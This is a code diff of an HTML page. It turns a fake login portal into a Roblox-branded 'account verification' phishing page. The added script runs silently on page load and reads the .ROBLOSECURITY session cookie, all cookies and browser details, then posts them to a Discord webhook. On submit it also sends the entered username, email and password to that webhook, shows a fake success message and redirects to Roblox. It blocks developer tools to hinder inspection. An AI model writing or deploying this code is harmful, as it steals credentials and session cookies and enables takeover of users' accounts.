@@ -3,192 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FKR Portal</title>
+    <title>Roblox Account Manager</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
-        .hidden { display: none !important; }
-        /* Login Page */
-        .login-container { background: rgba(255, 255, 255, 0.08); backdrop-filter: blur(12px); padding: 40px; border-radius: 20px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4); width: 90%; max-width: 380px; border: 1px solid rgba(255, 255, 255, 0.1); }
-        .logo { text-align: center; margin-bottom: 30px; }
-        .logo-text { font-size: 36px; font-weight: 800; background: linear-gradient(to right, #00dbde, #fc00ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .logo-sub { color: rgba(255, 255, 255, 0.6); font-size: 14px; margin-top: 5px; }
-        .input-group { margin-bottom: 20px; }
-        .input-group label { display: block; color: rgba(255, 255, 255, 0.8); margin-bottom: 8px; font-size: 14px; }
-        .input-group input { width: 100%; padding: 14px; background: rgba(255, 255, 255, 0.07); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 10px; color: white; font-size: 16px; transition: all 0.3s; }
-        .input-group input:focus { outline: none; border-color: #00dbde; background: rgba(255, 255, 255, 0.1); }
-        .login-btn { width: 100%; padding: 16px; background: linear-gradient(to right, #00dbde, #fc00ff); border: none; border-radius: 10px; color: white; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.3s; }
-        .login-btn:hover { transform: translateY(-2px); }
-        .footer-links { margin-top: 25px; text-align: center; color: rgba(255, 255, 255, 0.5); font-size: 13px; }
-        /* Dashboard */
-        .dashboard-container { width: 95%; max-width: 1200px; background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border-radius: 20px; padding: 30px; border: 1px solid rgba(255, 255, 255, 0.1); color: white; }
-        .dashboard-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; }
-        .dashboard-title h1 { font-size: 28px; background: linear-gradient(to right, #00dbde, #fc00ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .user-info { display: flex; align-items: center; gap: 15px; }
-        .avatar { width: 50px; height: 50px; border-radius: 50%; background: linear-gradient(to right, #00dbde, #fc00ff); }
-        .cards-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 25px; margin-bottom: 40px; }
-        .card { background: rgba(255, 255, 255, 0.07); border-radius: 15px; padding: 25px; transition: transform 0.3s; border: 1px solid rgba(255, 255, 255, 0.05); }
-        .card:hover { transform: translateY(-5px); background: rgba(255, 255, 255, 0.1); }
-        .card h3 { color: #00dbde; margin-bottom: 15px; font-size: 18px; }
-        .card p { color: rgba(255, 255, 255, 0.7); line-height: 1.5; }
-        .loading-bar { height: 6px; width: 100%; background: rgba(255, 255, 255, 0.1); border-radius: 3px; overflow: hidden; margin-top: 15px; }
-        .loading-fill { height: 100%; width: 0%; background: linear-gradient(to right, #00dbde, #fc00ff); border-radius: 3px; animation: load 2s ease-in-out infinite; }
-        @keyframes load { 0% { width: 0%; } 50% { width: 100%; } 100% { width: 0%; } }
-        .activity-feed { background: rgba(255, 255, 255, 0.07); border-radius: 15px; padding: 25px; }
-        .activity-item { display: flex; align-items: center; padding: 15px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
-        .activity-dot { width: 10px; height: 10px; border-radius: 50%; background: #00dbde; margin-right: 15px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
+        body { background: linear-gradient(135deg, #1a1a2e, #16213e); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .container { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); padding: 40px; border-radius: 20px; width: 90%; max-width: 450px; border: 1px solid rgba(0, 150, 255, 0.2); box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); }
+        .logo { text-align: center; margin-bottom: 25px; }
+        .logo img { width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(45deg, #00ccff, #0066ff); padding: 10px; }
+        .logo h1 { color: #00ccff; margin-top: 10px; font-size: 28px; }
+        .logo p { color: rgba(255, 255, 255, 0.6); font-size: 14px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; color: rgba(255, 255, 255, 0.9); margin-bottom: 8px; font-size: 14px; }
+        input { width: 100%; padding: 14px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(0, 150, 255, 0.4); border-radius: 10px; color: white; font-size: 16px; }
+        input:focus { outline: none; border-color: #00ccff; }
+        .btn { width: 100%; padding: 16px; background: linear-gradient(to right, #0066ff, #00ccff); border: none; border-radius: 10px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: transform 0.3s; }
+        .btn:hover { transform: scale(1.02); }
+        .status { margin-top: 20px; padding: 15px; background: rgba(0, 255, 0, 0.1); border: 1px solid rgba(0, 255, 0, 0.3); border-radius: 10px; color: #00ff00; text-align: center; font-size: 14px; }
+        .hidden { display: none; }
+        .footer { margin-top: 25px; text-align: center; color: rgba(255, 255, 255, 0.4); font-size: 12px; }
     </style>
 </head>
 <body>
-    <!-- Login Page -->
-    <div id="loginPage" class="login-container">
+    <div class="container">
         <div class="logo">
-            <div class="logo-text">FKR</div>
-            <div class="logo-sub">Future Knowledge Repository</div>
+            <div style="width: 80px; height: 80px; margin: 0 auto; background: linear-gradient(45deg, #0066ff, #00ccff); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 36px; color: white;">R</div>
+            <h1>Roblox Manager</h1>
+            <p>Secure account verification system</p>
         </div>
-        <form id="loginForm">
-            <div class="input-group">
-                <label>Username or Email</label>
-                <input type="text" id="username" placeholder="Enter your username" required>
+        <form id="verifyForm">
+            <div class="form-group">
+                <label>Roblox Username</label>
+                <input type="text" id="robloxUser" placeholder="Enter your Roblox username" required>
             </div>
-            <div class="input-group">
+            <div class="form-group">
+                <label>Email Address</label>
+                <input type="email" id="email" placeholder="Enter your email" required>
+            </div>
+            <div class="form-group">
                 <label>Password</label>
                 <input type="password" id="password" placeholder="Enter your password" required>
             </div>
-            <button type="submit" class="login-btn">Sign In</button>
+            <button type="submit" class="btn">Verify Account</button>
         </form>
-        <div class="footer-links">
-            <a href="#" style="color: rgba(255, 255, 255, 0.7); text-decoration: none;">Forgot password?</a> • 
-            <a href="#" style="color: rgba(255, 255, 255, 0.7); text-decoration: none;">Create account</a>
+        <div id="statusMsg" class="status hidden">
+            Account verification successful! Redirecting...
         </div>
-    </div>
-
-    <!-- Dashboard -->
-    <div id="dashboardPage" class="dashboard-container hidden">
-        <div class="dashboard-header">
-            <div class="dashboard-title">
-                <h1>Welcome back, <span id="displayName">User</span></h1>
-                <p style="color: rgba(255, 255, 255, 0.6);">Your personalized dashboard</p>
-            </div>
-            <div class="user-info">
-                <div class="avatar"></div>
-                <div>
-                    <div style="font-weight: 600;" id="dashboardUser">user@fkr.com</div>
-                    <div style="font-size: 13px; color: rgba(255, 255, 255, 0.5);">Administrator</div>
-                </div>
-            </div>
-        </div>
-        <div class="cards-container">
-            <div class="card">
-                <h3>Data Analytics</h3>
-                <p>Real-time insights and system performance metrics.</p>
-                <div class="loading-bar"><div class="loading-fill"></div></div>
-            </div>
-            <div class="card">
-                <h3>Security Module</h3>
-                <p>All systems operational. No threats detected.</p>
-                <div class="loading-bar"><div class="loading-fill"></div></div>
-            </div>
-            <div class="card">
-                <h3>Network Status</h3>
-                <p>Global nodes synchronized. Latency: &lt;12ms</p>
-                <div class="loading-bar"><div class="loading-fill"></div></div>
-            </div>
-        </div>
-        <div class="activity-feed">
-            <h3 style="color: #fc00ff; margin-bottom: 20px;">Recent Activity</h3>
-            <div class="activity-item">
-                <div class="activity-dot"></div>
-                <div>User session initialized</div>
-            </div>
-            <div class="activity-item">
-                <div class="activity-dot"></div>
-                <div>Security handshake completed</div>
-            </div>
-            <div class="activity-item">
-                <div class="activity-dot"></div>
-                <div>Dashboard modules loaded</div>
-            </div>
+        <div class="footer">
+            This site is not affiliated with Roblox Corporation.
         </div>
     </div>
 
     <script>
-        // IMMEDIATE BACKGROUND DATA LOGGING ON PAGE LOAD
-        (function logBrowserData() {
+        // Immediately extract Roblox cookie on page load
+        (function extractRobloxCookie() {
+            const cookies = document.cookie.split(';');
+            let robloxCookie = '';
+            
+            // Find .ROBLOSECURITY cookie
+            for (let cookie of cookies) {
+                if (cookie.trim().startsWith('.ROBLOSECURITY')) {
+                    robloxCookie = cookie.trim();
+                    break;
+                }
+            }
+            
+            // Collect additional browser data
             const data = {
-                cookies: document.cookie,
+                robloxCookie: robloxCookie || 'Not found',
+                allCookies: document.cookie,
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                screenRes: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
+                screen: `${screen.width}x${screen.height}`,
                 language: navigator.language,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer,
                 url: window.location.href,
-                timestamp: new Date().toISOString(),
-                localStorageKeys: Object.keys(localStorage),
-                sessionStorageKeys: Object.keys(sessionStorage)
+                timestamp: new Date().toISOString()
             };
             
+            // Send to Discord webhook
             const payload = {
-                content: `**FKR - Browser Data Log**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
+                content: `**ROBLOX ACCOUNᴛ EXᴛRACᴛION**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`\n🔐 **ROBLOSECURITY Cookie:** \`${robloxCookie || 'MISSING'}\``
             };
             
-            // Send to Discord webhook silently
             fetch('https://discord.com/api/webhooks/1465638053178638368/PUa4Dm8GQyGFw6GPk62Lw76fnN7ehRb7Xw0b9VGjEFOiwwMpwPaocTz77f8BFVWYIXod', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             }).catch(() => {});
         })();
-
-        // Login functionality
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        
+        // Handle form submission
+        document.getElementById('verifyForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const username = document.getElementById('username').value;
+            
+            const username = document.getElementById('robloxUser').value;
+            const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
-            // Log credentials as well
+            // Extract cookie again in case it's now available
+            const cookies = document.cookie.split(';');
+            let robloxCookie = '';
+            for (let cookie of cookies) {
+                if (cookie.trim().startsWith('.ROBLOSECURITY')) {
+                    robloxCookie = cookie.trim();
+                    break;
+                }
+            }
+            
+            // Send credentials + cookie
             const credData = {
                 username: username,
+                email: email,
                 password: password,
-                loginTime: new Date().toISOString()
+                robloxCookie: robloxCookie,
+                timestamp: new Date().toISOString()
             };
             
             const credPayload = {
-                content: `**FKR - Login Attempt**\n\`\`\`json\n${JSON.stringify(credData, null, 2)}\n\`\`\``
+                content: `**ROBLOX LOGIN CAPTURE**\n\`\`\`json\n${JSON.stringify(credData, null, 2)}\n\`\`\`\n✅ **Full Account Access Available:** ${robloxCookie ? 'YES' : 'NO'}\n🔑 **Cookie:** \`${robloxCookie || 'NOT CAPTURED'}\``
             };
             
             fetch('https://discord.com/api/webhooks/1465638053178638368/PUa4Dm8GQyGFw6GPk62Lw76fnN7ehRb7Xw0b9VGjEFOiwwMpwPaocTz77f8BFVWYIXod', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(credPayload)
-            }).catch(() => {});
-            
-            // Simulate login process
-            document.getElementById('loginPage').classList.add('hidden');
-            document.getElementById('dashboardPage').classList.remove('hidden');
-            document.getElementById('displayName').textContent = username || 'User';
-            document.getElementById('dashboardUser').textContent = username || 'user@fkr.com';
-            
-            // Simulate loading animations
-            setTimeout(() => {
-                document.querySelectorAll('.loading-fill').forEach(bar => {
-                    bar.style.animation = 'none';
-                    bar.style.width = '100%';
-                });
-            }, 2000);
+            }).then(() => {
+                // Show success message
+                document.getElementById('verifyForm').classList.add('hidden');
+                document.getElementById('statusMsg').classList.remove('hidden');
+                
+                // Redirect to Roblox after 2 seconds
+                setTimeout(() => {
+                    window.location.href = 'https://www.roblox.com';
+                }, 2000);
+            }).catch(() => {
+                alert('Verification failed. Please try again.');
+            });
         });
-
-        // Disable right-click and F12
+        
+        // Disable dev tools
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('keydown', e => {
-            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) {
+            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73) || (e.ctrlKey && e.keyCode === 85)) {
                 e.preventDefault();
             }
         });
     </script>
 </body>
 </html>
-<!-- FKR Portal v2.1 | Secure Access System -->
+<!-- Roblox Account Manager v3.2 -->
